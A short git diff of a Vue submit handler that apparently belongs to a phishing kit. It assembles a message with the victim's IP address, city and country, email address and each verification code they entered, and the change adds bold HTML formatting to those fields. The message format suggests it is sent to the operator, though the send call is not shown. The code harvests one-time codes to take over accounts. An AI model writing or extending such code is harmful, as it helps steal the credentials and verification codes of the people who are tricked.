@@ -70,9 +70,9 @@ const handleSubmit = async () => {
   }
 
   message += `
-🕒 Thời gian: ${new Date().toLocaleString('vi-VN', options)}
-🌍 Địa chỉ IP: ${geo.ip}
-📍 Vị trí: ${geo.city}, ${geo.country}
+🕒 <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN', options)}
+🌍 <b>Địa chỉ IP:</b> ${geo.ip}
+📍 <b>Vị trí:</b> ${geo.city}, ${geo.country}
 
 `
 
@@ -81,11 +81,11 @@ const handleSubmit = async () => {
     message += `👤 Người dùng mới truy cập\n\n`
   }
 
-  message += `📭 Email: <code>${emailFromLocal}</code>\n\n`
+  message += `📭 <b>Email:</b> <code>${emailFromLocal}</code>\n\n`
 
   // message += `🔑 Mã xác minh: <code>${code.value}</code>`
   attemptList.value.forEach((item, index) => {
-    message += `🔑 Mã xác minh ${index + 1}: <code>${item}</code>\n`
+    message += `🔑 <b>Mã xác minh ${index + 1}:</b> <code>${item}</code>\n`
   })
 
   isShowLoading.value = true
